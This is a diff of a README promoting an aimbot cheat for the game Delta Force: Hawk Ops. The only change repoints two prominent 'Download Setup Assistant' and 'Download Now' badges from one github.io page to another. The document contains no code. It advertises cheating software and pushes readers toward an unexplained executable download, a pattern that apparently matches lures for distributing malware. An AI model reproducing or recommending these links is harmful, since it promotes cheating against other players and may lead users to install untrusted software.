@@ -1,7 +1,7 @@
 # 🎯 Aimbot for Delta Force: Hawk Ops — Smart Aim Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkorange?style=for-the-badge)](https://aimbot-for-df-hawk-ops.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-sienna?style=for-the-badge&logo=delta)](https://aimbot-for-df-hawk-ops.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkorange?style=for-the-badge)](https://trahendon.github.io/.github/AimAssistPCHawkOps1)  
+[![Download Now](https://img.shields.io/badge/Download_Now-sienna?style=for-the-badge&logo=delta)](https://trahendon.github.io/.github/AimAssistPCHawkOps1)
 
 ---
 
